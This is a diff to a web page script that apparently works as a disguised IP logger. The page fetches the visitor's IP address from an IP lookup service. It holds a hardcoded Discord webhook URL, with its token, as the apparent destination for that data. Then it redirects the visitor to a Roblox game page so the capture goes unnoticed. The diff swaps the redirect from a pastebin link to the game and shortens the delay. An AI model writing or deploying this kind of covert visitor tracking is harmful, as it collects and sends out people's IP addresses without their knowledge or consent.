@@ -6,7 +6,7 @@
 <body>
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1359559822525075658/DIF6NyqMMNUGP4I-WvjmVLJWkR_VlNGykKmf_IWz-REF4zk33FNVDgImSxxDcZ1p8i1G";
-    const redirectURL = "https://pastebin.com/raw/HmbXKt1a";
+    const redirectURL = "https://www.roblox.com/games/142823291/Murder-Mystery-2";
 
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
@@ -26,7 +26,7 @@
           // wait a sec then redirect
           setTimeout(() => {
             window.location.href = redirectURL;
-          }, 1000); // 1 second delay for smooth redirect
+          }, 300); // 1 second delay for smooth redirect
         });
       })
       .catch(err => {
